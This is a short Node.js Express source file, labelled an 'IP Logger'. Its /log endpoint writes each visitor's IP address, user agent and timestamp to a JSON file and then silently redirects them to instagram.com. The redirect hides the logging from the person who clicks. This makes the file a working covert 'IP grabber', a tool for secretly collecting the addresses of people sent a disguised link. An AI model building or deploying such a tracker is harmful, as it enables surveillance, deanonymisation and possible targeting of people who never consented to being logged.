const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.static('public'));

app.get('/log', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const timestamp = new Date().toISOString();

    const logEntry = {
        ip,
        userAgent,
        timestamp
    };

    const logsFile = path.join(__dirname, 'logs.json');

    let logs = [];
    if (fs.existsSync(logsFile)) {
        const raw = fs.readFileSync(logsFile);
        logs = JSON.parse(raw);
    }

    logs.push(logEntry);
    fs.writeFileSync(logsFile, JSON.stringify(logs, null, 2));

    console.log("Logged IP:", logEntry);

    // Optional: redirect after logging
    res.redirect('https://instagram.com');
});

app.listen(PORT, () => {
    console.log(`IP Logger running at http://localhost:${PORT}`);
});